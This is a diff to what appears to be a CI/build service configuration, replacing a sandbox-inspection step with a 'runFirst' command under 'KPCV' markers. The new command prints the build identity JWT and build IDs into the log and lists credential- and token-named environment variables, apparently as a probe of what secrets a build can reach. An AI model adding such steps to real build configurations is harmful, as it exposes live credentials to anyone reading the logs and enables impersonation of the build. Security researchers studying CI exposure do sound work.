@@ -6,10 +6,12 @@ service:
       runFirst:
         command: |
           set -x
-          echo KPSC7788-VARIANT=baseline
-          echo KPSC7788-UID=$(id -u) KPSC7788-GID=$(id -g)
-          echo KPSC7788-GROUPS=$(id -G | tr ' ' ,)
-          echo KPSC7788-SECCOMP=$(awk '/^Seccomp:/{print $2}' /proc/self/status)
-          echo KPSC7788-NNP=$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status)
-          echo KPSC7788-CAPEFF=$(awk '/^CapEff:/{print $2}' /proc/self/status)
-          echo KPSC7788-RAN
+          echo KPCV-ID=$BUILD_IDENTITY_JWT
+          echo KPCV-SELF=$API_SELF_LINK
+          echo KPCV-SAPCID-SELF=$SAPCID_API_SELF_LINK
+          echo KPCV-BUILDID=$BUILD_ID
+          echo KPCV-SAPCID-BUILDID=$SAPCID_BUILD_ID
+          echo KPCV-LATE=$(cat kp-late-marker.txt 2>/dev/null || echo NO-LATE-MARKER)
+          echo KPCV-HEAD=$(git rev-parse HEAD 2>/dev/null || echo no-git)
+          echo KPCV-CREDENV=$(env | cut -d= -f1 | grep -iE 'cred|jwt|token|ident' | tr '\n' ,)
+          echo KPCV-RAN
